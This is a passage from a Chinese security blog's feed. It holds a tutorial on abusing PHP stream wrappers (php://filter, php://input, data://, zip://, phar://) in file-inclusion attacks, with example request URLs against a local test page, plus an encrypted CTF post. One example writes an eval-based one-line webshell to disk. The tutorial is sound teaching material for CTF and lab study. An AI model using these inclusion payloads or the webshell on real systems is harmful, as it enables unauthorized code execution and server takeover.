rel="noopener">https://www.php.net/manual/zh/filters.php</a></p></li></ul><p><code>字符串过滤器</code></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><p><code>转换过滤器</code></p><table><thead><tr><th>转换过滤器</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td style="text-align:left">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td style="text-align:left">quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><p><code>压缩过滤器</code></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><p><code>加密过滤器</code></p><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><ul><li><strong>示例</strong>：</li></ul><p>      1. <code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="/images/140-4.jpg" alt></p><p>      2.<code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-5.jpg" alt></p><p>若有写入权限，写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-6.jpg" alt></p><ul><li><strong>-参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></li></ul><h2 id="font-color-navy0x02-zip-bzip2-zlib-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-zip-bzip2-zlib-协议font"></a> <font color="navy"><code>0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）</p><p>      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-7.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>      2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p><img src="/images/140-8.jpg" alt></p><p>      3.compress.zlib://file.gz</p><p>      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p><img src="/images/140-9.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></li></ul><h2 id="font-color-navy0x03-data-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-data-协议font"></a> <font color="navy"><code>0x03 data:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.data://text/plain,`</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-10.jpg" alt></p><p>      2.data://text/plain;base64,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="/images/140-11.jpg" alt></p><h2 id="font-color-navy0x04-http-https协议-font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-http-https协议-font"></a> <font color="navy"><code>0x04 http:// &amp; https://协议</code> </font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-12.jpg" alt></p></li></ul><h2 id="font-color-navy0x05-phar-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-phar-协议font"></a> <font color="navy"><code>0x05 phar:// 协议</code></font></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-13.jpg" alt></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="font-color-navy0x06-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-参考文章font"></a> <font color="navy"><code>0x06 参考文章</code></font></h3><p><a href="https://zhuanlan.zhihu.com/p/25069779" target="_blank" rel="noopener">文件包含漏洞原理分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-file协议font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-file协议font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-web 类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/24/2020.07.24%EF%BC%88139%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/24/2020.07.24（139）/</id>
    <published>2020-07-23T16:00:00.000Z</published>
    <updated>2020-08-17T14:27:59.670Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="692903eb44847d6e7ca78b57bc76c46b1bb17cf17332e58bde7c47c7b09844a9">85622e100507fc49db72026265d5d53bba5b2917323392df3e25f34662e8ec7b810c8d44d76d40e16fbdbd3bceafce506ee0f71bb2bbfdd1eaf450ee0a105c6deea4c486e92e0c4bac943e67823a234b9114b182c464fdd47323f84306375f42daed9b2e52003f78f4d2b970db66844e544c36dce4bcf0d2a388323b857a2371265c6129844bee07e33bcefbe1ff53f7f33fb21367df64cca786878fda574703b61e845f6dfad91888afd636f94228407963269ebcd8e1b59a8fb5247718fb9e1b8bdbfafaa2e43a7ee57b6e2276f5a4fd88dcea6162b990583ef510c557ff342f876ada61e80d9832ae7dbd92b87be5830e5f3c0f20d92725465b5e2cddefbfb7921b2b81abd24c28f651e0b6c6ce4487270eba8570a56f6e97c3c92d099239d24c0d6748d6004ccb97aed007f93dee4ec2660f7213aafae8e6d5ed54867d4e49ee74515e4afb57ed26c6076657b7dfb6dbe2e6861a2f275fe81a050439b62b974e4baa91cb6e29641e026d2ffa4ae7571943fc81f97639bb54da093cd96d23ddbc1f6e5ab74b7c5979c0f35b4645992942b104c85cb6315fe63f53bb74f793a61c0a44ffdce2297fc28df4c7e1602438090197c2f23bbae0303d631b6e24a20549a914550f3d6a7a25dea7f728e9be5eb2bcf18b66b8e95907300f3da95d667158015ef41a7513d50167542df9866ad39040bb15638feffac200a834ccc12bf414d616f8555b11307807736d54ea12b6f664462134c6ef421070f202b1dfeab1e17584b2400a842a1374f3fe6ee5fd939e0d2e33113f0a000d5bd6eb8effb49eb8951e121d08fa9cd9f2662943de2c5ddab490e5659b76d0e318a7948c37aa0c431b425a2744ed248e1a7980836d50a365fce8197b152527be0927d2c0216ef87a9500eac3ae3d1b82ca802b306441b6d89d60c199f806ef6d80d5498887bab08ba1a07a8e6e1ef66f459aee708b365d92a8c5b4dd0c0529cc760aee9dad643ab37782c0b6c32d72bf17f300442b1b3a6a292cff70711944a361b6bb9c0e7230ea58f6ae8788604ba82613a31b655a3c3fa10289840869939bade625e6b2fdad0cc3a4feaa683b66159697ac9044ea4166cdc45e4f7e329fae3c29276aaf728587c67ce1dd33be0b5465c28a00223a987b9f821c0729080f1b353b90c0b6b4c81cd4be5ed5c34b92550d5cfe852ae5d56577d095383a4aca3c8a25eeb79b2347bf0d7ac2137875de68f2a993f4db61b4116acb49d980b220f64b215bd11772e0e9977d7d90442a13cf7a035abda4550e6468a303627fc91ef209941f39603b069ff17664f4192ebfddbd8a98dcc08b6f88f132359d52519455c72cd1e7cbce04e9ebad693a0128b20a0d9cef3dd326921a7a2bc486a3b9464967c5ebcf358cd4d73e1848baa96fd2db1ae52d1c25cb6aefa4e7d6aac591097fefe57d80b7f52013053bc74ff16b9085a4c8d6bc296cbef67c053126d7309506e9858e4dd6b765db9ae6f07b145a3a1a62ee7eae28903f91309c5a05c3bb8605664e51823f72ccc5e151885c1a672b0fdc381a2d00fbd770b40950d3792be8e5241088598fcecdc555685e434eaa0ca35b25cebc8def30f64d698fe1db7dc569b9aadb3ae0be684efec7d48787c718360bea169a5254a03fca9ecd1c6eb58b3c4955f1b6c3857b8ec053de5e70385d79717e020893df47b707d3c1a70836ee0ad4a169da3b10a5439f355fa94da3a20106b8b6f68d0de47bf0b831536e60305a1e25915524bc4cae86e88222f5dd643132c9cf844d8e56b0f125f9a1d0e8f34a36dcd187b642b835311021fc011adff0f675de3cb6df7ff97c74885d7a4d799665e9c0c20dbf4788d1c0a85ae8d9fed7163975d73a8b001daa6437fe7390cb920e9f27383da666e1a62e4df1a07297d91e38e00d8bc48ee1bf36629c962d9f5af00454caccdb35a5294ff588d6f7e8112a240909b833554f62f1d5beb061af4c72378c1c83085bb2ba56f6c6998341e57cb11fb58206ec94ec4e66a66482be1860d627a2939d3cc85c169a25db004af8978e62c1700a15bdd064dbcaa5ddae769424bb61934bd19d296094873198c434fef1bb31eeeae10b548e768980fb66d2b19d93a1f3cf7058129fe80841683c0e1ff55166b4528d3ef559cf1527137eadc8820b4cf8780f04ca6b3a504e2facbf6b7bedd15b315fe54aff56bad28bda7450a2ff8b7a4bb9f55b2868eb5ba91c87f5526329a4083dd5ac151cdf17c4a8e647f06a35a7fb9c8aa97f2d8ad80e7b1a13e52359e6137546cc7e29ad50de7927e6f787938ad9f718831fd0238c53f0c93da68d05b688adcca5456a39c46448997615e0751aac6e0dab794a06bc08e6d5ecaa39635f4b2199217c9b7f4ce6bd7e1792b7462672e8449c6ccf7c4a49b46fba3826c4af66a9afb6cc93bf989fb47ee4897c11305db83c5cc4b1a0d2dca24ef1706ca21c3301b7962d6db484ae0942e7797605999a4ba87654a02f52142c05568fd6b9bd7108622dccd7bb527504970abd2fcfe16fbfc10dee037f94c3d5a9ad2d78b55774b2b37b2a9d3308ce8f5911e2b1ca2de3d453ca346afc53e9d053fd3cd49ff88d6026877aadd8acf349b0a648533958e7a8b4519662fe2cd0aca2a4bfe9afa2a47d2b20cb38798a5e136c7bef7a2567f32acabe43c3151169db63debbdde957009a91189a91f04a353384ade5ffd4591b347be2b9aed4a55a2baa2a2469ad9d1227d37071a5b0929d170672b7d2b0a33d81a1d69eca47f9bf1b60634cecd8bae555a0e307f0c0fa3fe248299a4d7348a1c0cb0ab438371d99d7f25252e7fe864583321f101b108b798271b82c0f211fd38615d6ee0bb200ae7a90aab6969b958be75773e1f128329d5309815deb5b46bf8d8323c47a026cbe7f6f4b580f6a0ce10ae14d89d353f0b5eb89deffa46a0ed6ba6ccee7a9f823d18211851a64515a18b11a97d1406a5cbd8950f0bf2794c13ec5397e8b09ebd758a10360cbaa1d68b589adbc753b6800b2f40c645de3c38286b9db343af40cbcb57cecc0574dad92225e92bd23311ff7e61bd53dce75f4cd4850b0f7c8a91f22f446ae7f83d1a51c2dcdb059093c6011516f8039d550b8a4ac107ebcb94150f01345d7f63fa58e3fd92d8efa4d517e299e55d8971bc1f10673fac715fbbc871d393a3eb3ea2fdb91bfcf05589e17be627e6bafef31172131e7d13296dc1e794be590df0df5db098605f24bff313f7cb0d95220983cf111d665bad569309ccee686e9dcfe8e1706e4f30e6703762017689dd65661a1f19cab32159a8605a4fa6f0dd1f4b6cd3c5581411511e3aadadde42044e3e854b3885d64379ce393d780518a9e0d8469c209c07c07d01466193c6363214e997de4764e2fbb665f7a57406e0535752a84f4e15db8a968ef0a71f6c138cdc09c36ab4881cc91c2f505b676d02ba3cbf7604ff8476ab7364994546739717e85d92472b39402eac9106853eef9f12a72b921764632a874b5a3091a8c014a491116910ab652a3608d288beffd52e1649a285fbe8d91f086e7d8263dc18d8905cc04997dab8a2707b85073e6703943deae7f89d6b619288b6c6b76c3636295ea876b3301b9738ed2c4d882dcf99ccd42699f11e5cd6e0938d34499fc06778fdb13b86d238ed609cdf86a7772bd71c7126c1c0e76bdcc2d672fb4e8cadb4a8d7e036044b150f2bca29b3543734c6e3824ce0461c453cdbccfd8e96c857b53ac997fb86d72361827fb96d964ef8b0c0d3ed88b8927c54bde4c9de570a0aebcb1c9771a04c57a3510102d5fe27a58b4d0c57b3b25a71e424011a0f9bd37d2fda04f828540eb8feef1b9c98b01d1d1a9b69e483d1fc64163860db50f14ef87c0b59399eafc473e819f8ccb41a86c39f42f0f308f4e137b17a7cd49850b0bd1a53383a3a9af0c51567539e03641f337fffea6fe2c0d463215ffe2f767f9b50f6e75debd8df7936b4c21add28fb80065211fba07cf10bdd0b361d638b9b7f715428aa6f1ef3685dbb1cd01953dbacd54cb3fb5de7d22e60bd699e75866a00d70d61fb2811d1a6efd18ab175f2781abd0ab771d7e898a36bc79fad964bb4213946497be94f5cc4c8c854c2c4104390f3305eb222b828fdab3d0717daa65e7cbdb07831b70a080419a61a8c3271ff026be765e133c78f50bde9ee17875c7dca07e7a7fec687940ca1fd7f65d421f22a052ec02b57af4856fe800d6ab9818843506fe69eeaaf793fe15ab22ecb8dd9976c5988c7dcd4c05005800506e83359ced236683291d9d2307a0cef14cb3c1c9a103d07cd96bba83751992ff87e509616e54e85169aeeebf245ddb00ab5103e8587e3ca0f3bb2a7a6f447faa84f33209d7c9b0a491f3e25a88888085e9ef976811ac3a7ddd3d4440f801c87e3127df86659f621e159d84222bafbcae9245f66c2198a665a61fd9242556b01637db45df109337f8f15f531065a2ba52537cfbd39a44f7f222b05812bc5e607d22241d89e033cd73a0ed742de991c726686c996e6fc3728921bb42989748292cb81bd9a8b71c26165d1f1d4e5ac881f504b583a3e83f2e904489edecd811114968f87e904195508a3c52c00f8f3fd1834dc1636fa7f3322a90eeff9789f2068ac053a350eeb91f98f4a2d45c7b8be90728030c7028a3796d1367d5a369475948c9372bbba8a0c47019a51aa7dd3911d7aafc30244b975444d9813f6aaa47bafd20ba550cd7cc487afdedc8a6c00279c73d9ac62437b553bc71073f16e4507cd7e05282321c8fe47a5b48d514f82a90f4945cf448e6e31279522b0522e2905c707e67d130ceb820057e9c8878fd6f735c3e04624aa13e85ecfd93523616ad0c6975635403769ff0ccdd1f22cdf3eb90bf0e2ad501152b959375350d8ef1581b49f7a2cea5088e6cbf4918daccb5f3eba403bbaa46c0fb8dec86adf272dc817d0adabbf1bf815602fba12b2cde65b0f149212e6fddd42b1ffaa4719e312e2ed0324fa7759dc76957fae9e7bcf8c5336dcfe7f7aac5d084695662b32ecad9ccdcc26eeb808a53401ba21d7bc649dd8b0afd1bde06fa229519989b053696d597ecb539c872c161b5ca8cf7053d7664789541412b1de7bed2220f403ea17dda51da63bd70b5cd8bc37dab912f6ca7b356119582e45605db5cd5c09d070a55cb3bdd387ba3fc414c9212583f866ef17988ee994ba45a28f6e20360c437e6d79a80538130bcbc3cb08dea8c1baf31f85e233417e73c4437191ea487ff3579e51c2e7a483f553f31d54d3b2da88a326d419ae910b7981b753a861ad353e03c392d27170708a14f2e3943edf7848612ecbf4129a04bfe864160c3e8579d25061d436ab18ba26cdd5ea522700b514924697c298721f086b60b6d2aac29a07f7f2a30f094ccf83fc2d3a61716873e25d60c1789307950adf741aaa1a47c3f6972c2bd4f1d2c8eabccb8bb7102c092760eebc5009ea585985202f20ed54837832e2fb277c751cb232b1638a93214ec174136997af8e8c149fd7cb169656b80ea94c91466d6371d01f4e5455e372961d0f69ce99364595420a0881e0fc230ad42726a2c02ba85a3bc0fcbbbc8b3d46516a9957e1af5affb1e9a27a8e138c3c58360d2aab6ca53e317f3bfc154c15dbd523849f0689d97f0c44f42cb9eb4644c5feaf56e57256ec0c9c7a8f274815dcb3d9858f620e2067072e5b329463fcdee9ddc2164f8e41fe075e0faeaae931896122b128b3d765e25344bec7fbfb7674f46fdba932a6654c477769e37b6c72978ca8a99ee49f5dfb3bb83e008e26b5f7ae319429baac6564516f62305cc72d2bf35ac6b891bd80433eb6125e24e7a2678bd76bcd929818e7c047b182b70eb173d1a12eafa63c0ef1a680d4d6135324372bb5a0e7f8443edd888462d071467c42581fa5686d1925121f2b618091f6ca9d2084d1b69ae12c1631747106599f6c333bbf13fa8fdbda8d02eec055d5aba8048acc7c5ea77a2ddded4e0456360785d71791cd1a4228db3bd2bc58bfe4678799763c85a8467a6f4891c81c3e39c3eed01acbc68397bb621384b9137ac05be419dba11a085fb5a1b8487a98108db1ab8996fbbbb7007dfbed687e4af8b61f6e8fa0b7630ec7ff5e0c180ee432518e1b753994f8e0500eaa0cc2bf4ee978acafbb36a69d41e7d57d2026e110c097ebbc9c9738211d24fd20274cb599da9fd75e3c521ef78b7715e06ab74ff4ad1449cf1879d20ec3b4e066238c60e29f193078908ebf6e5b34b1654ed924b7f2551af48b294c0a4e5a331b43f08cbc63ce1ad3a61cc14134d7f49ef61c14b73a5d3a24cb3e0eaeb8ad2455e4ad244bdadc389327dba6862e8374b3d638153e8b9e72bf405b4deabab6852a75d45fbcae60af8bd6338fc7f46a667d30deaaba52605b181c57044520fbb57eb341c2072b6cb8b4089ddb15a6201472763f3ff378f284445ca45eb753a0755b8db80e5ef37453c2a58c1a9dda8bab757756746af1aef06d63fa02b0a133697f53dbaeb768edac1d4dd6625ce51ab0a9b6c163aa7cb1f2cc1b6ad62161fe34eae0792e07c864754cc98680297001a7947d58af6312aae965593a63a8f87ba2d58a1e3d557bbdccbd185b0512050483007b2b63319aeeab0118b88aa934dbf8f450ae4036d5fba9ce645f0d88a3d041902d9aa5a3033071e8a924d2cb0eff4f75ef87b1b6009d3bef529859c946af58c591708844484ea268ce514903d6b1e6c36622fb23c85e4cc08bce4b09c657a879f3024de975421dfa9f273a7690a8540bd0f2698d9a90b88aaad298ea920fbd24ec5691bc390084f4dc475e7ffbe20f1759b11241a88a6c7f0518d960c726114343b5dc190e450772afa588d84fe521b2b79d7187fcbcb6a4e24a0724e0971279f42cd5e27fa6b4593bb9cd04457e88c115f1eecdd63882f4bc46d9c763d0007fbfc890804409abfd2aadd43604618d513953af0ff906fadd47259f9e7b7bf659d7d12591084660199dd579ec3df6a110205e5cd791c5cde404c15f6a4e4000a4c9e4967f2ed2446cd228ba4835af37c23e24fa223b0f0f83fd20921a81ab3acc3f0116ba74dd2b02cc2742238788e0657bf4dae957b8821d084bcbf2ca26f57982f3cc30c28b28546c5c119bdfaa3de064ee80454ddb153a528adbeafa3b8512ecd30729187443c2db8171f8c7c394341d896378cdd8f4614c0f596348ed067166184192260c6556919e2760a9cef66de7e9e25f6ccc758ccef21d1e70bf9d6063c0fb3e8bae131cece04321aa66179975936f355174c0d00ad4fd9d78fe4ff08fa85d1d3ae839e95d916a99e8f99123e717a2f6efb671c078710f6a10eeb1d39bf78e13a30723b9cbc6c78d4f2dbc5e1d689c0bec57e2b812c205497e9801dbc884b1de1e9a96716ac1deed08b17e87f2f9990cd85d937045520882095ec2ac37baa629236708b970cf417101a7532ebe3786363409e7792dac6b033d4f81e33747c13162a23068c681bfce078d4195879597460d96dda948c089d5a11e4d2527bda37d5b945cf57c2b6468b28af2504ef7422f12470fb74b74454e5c66b0b07a91b44175660105c93c0df05a896f95863f9f3d92bdb5d9ea571890a6a1b360d7a223086e33f21c0c75738ea2b29a28d4171ce9465ec165844d93a667600e0b24c485ec8d8345ef4880abd4d0bc39e1c6e66a1d1a46d7f7db7b6bf9e2198bfd8756b6f17d6ae3eef0ef57b260369e12f5623a69ed2bacf1706a09f3dfaf1e7e7ffe752d9c2f1547337476b6881a53401a89a177d5352d5873527df0f499939454fc38771d042c22bae1b8b0da60112145538ea6a7ca5f8c6c12b1c07cca5d4751f9d2820234f042515f76e24c142b888e25f69dc566798133d05c5dad593d7ce14ce49e632b8908c3b86ab50d145bf9f17619706d3369e89af2a50bbd0de892cd788eeb85b192180565e58840fb893cd4db9dc4dccd3aafdbbc597abbb384fb9938611dbab51373b2fa5b495be68e1a1642c757c5060fe818086d6baf7b3c768d127e3c8083227152bcde2c3ed269f23493812705ae6a6b1f8837eb12e7587bfa657c53ea2285a0c459f5e224e3be1d176d53a15f36ace6cd27388672a8df35b80666a1bc8d3b95177e6ccbdf338aeea46cd963abf2f168fd76c0415e077aa8174a54e6ccbbe794a1578865fc8fffcd6a48dec25640bd220b2748e6a05b56aedf3723a50eaf4d865188d681b3d919a9a29c13f7bcff1d59984b02890c2f49546faede27b06a7afeba70db91a20405f38974edb7ca3c2f7241941926e38d3c032ca506063ec7e8f9d31007f6fd982380c71408e2653ea04f7a5af7e36e1950f798817d8cda34275a5a25a70f1b1ac2c338ad6f93c2f63c39274c4df75486b70acd3fc01d98812449e934c6e24e59e07d0f073eff046d699a0e5165fcfc6d2c16a46c3a6581181ad451ef42cb959c52e9245118c45ca6d3afd4da6aa1cf56b679f4d46d57772e2dd3e4535cb04f7e0e00673f2d0492441ec2823236660bc1ba7937c9e0ffb92306f5e3ddeff9485c9621cb5b0042d084c4e47e6b0b37d09a5c99be813814c7873933ca9929be6fb1baad488ae509487f96d03dbac25f24dd153cc10a71585653f281c3065a233978ac3f2db866cd5b13b8db3d8a560b61168ecb8fcaaf9e027f7b2cab7362184357d17cda0a5b6418758598b9f95c3873e3735bbf75c81dc40196af4fa92c78117a4d63399cc027c8f899479a93ab4f1f3288f683229afa099dcb31018e6065c8c4d62847491d633c609e2fd069410b2bfedc6bfb0a571d99b018f6035b56c739c6c0229cda4f3174dc10f7808312fed1db009be947c00cef72ba88bbc9827e358f1db4305c64c2ab368294a21bb8f5bdd875c997925cb6e48dfe27bf8c44cf8aac23eea9f8fb9ddf38d56cca711e77843d644075c8f8c57f1f2a4a544d7ef963e7e17a8aeafd775c6fe218f07f38cbc291130ee1d5d91118cae18338542eb128b945791cf04f2f8903be6948ec55f128c39296a5af36563036c68f6ba30870a8e4b73c10c7331bb8d4dd9f5308f01aa33ddcfdf2ba49ffd83fa467a7c940a21b866dd8b428c6904eef0ee55c0065381673326d6ac939a5e868c1fb5160fc9eeaf3a2b4ca328a95c1044ceb9e2a2f04a805caa9224ca3494b331dfa21ffa3a5f55efee93624a9b90654e35beb6faa23f803d01243b9fb9068bf785d83d30240d52ac414fd9ad9aa07b5649805f79988a0afcf35ce8091ec94a7effe4d276fbac23d2801e642e9335ed2b84d2883c40cead235c2dd371e3f7ae0b3ca989e2017fb7fea2ed90ecc47149b0068f00c356360874579d4d42d06017f11586f2f21c9300985f1dee5c387c0c0b39a9be795672dd1a70e55640dc1be29c4ebedfd56dacba0b63a21df80bbae7bd19835d04bf6d9470ccfb295c355df670f8d826fff49dff9d96e63b918cc826faa94da2d664dd5c743efa9c50ca9d75b5fed5fb711d2ef6f9cd713eafa0d4cad54711a0d65b0ca95dd16a870d6577742f7430e3922b5e125e7ade00e90164ec1f8645e783e5fb14cbd309852de1cadd729260f42da3f662768c51356f81bcfa5c67b188b1343e275c9e89aae17de8e2a1a83736f61c01004ee953f3af82d0f2a4c3ed0a8efaf3fd12fb0567013997e05a7e3ed1701b3c9496b64d7b720c2f2b968d21aca48d09b39efac41a8b6676b82e016540e6e5dcf98a8e1abedb98cf3848b69237503af6cb05154bedd4ee121b6701f55cc325ed33573794703d58913d48d05432167f764053f010b4ece2411965ecee024953d3d7a4772ecfcab67dac0c4f56a4681aeccf878a4b478942737d3988d7dc1f95f67f8d41a27f93032f4d58262c930e8dd9d24e8cb5c0159a563f9add806a6cd23af9226bc48ad4a07a237f89edb234d6df799eb47f46c9491bbcdbdc2c2ba4a00a377ca5f061608770c86862a65fd9261200dcc2dc846487373a443c3a216f25f06f5b89072b662db8f2cd5353653c752e15a932e894fa2811cb3cf02241173a2f051eff600fa0eef387fb01a481fc03df92d4e6eeb8d81d32271077e50f89f6ba8076e9ab1b90165af27916b06a1867c2ecbabe75523aa8f07c8ac6f9f2c09f000edcf7378a380531ac5fbd69069671bb8c88966d5a16cf5a9afd61e06df4bbdd97bcada577a309d4e27db260b1d5eefa067dca9a95be82ce4492378f729af5c32041a796336ff0a79ff6e4d10741a8151c17daecddaacb40f4478c4e1d29aefa1f0d697598fa38e4407e591e855b409b24766055ee34c56c53be20494badb1fadb14e095214caf7c84fc32378d68f0af181a2e391c7e73d1404f6661e53a1f2b2c86ec2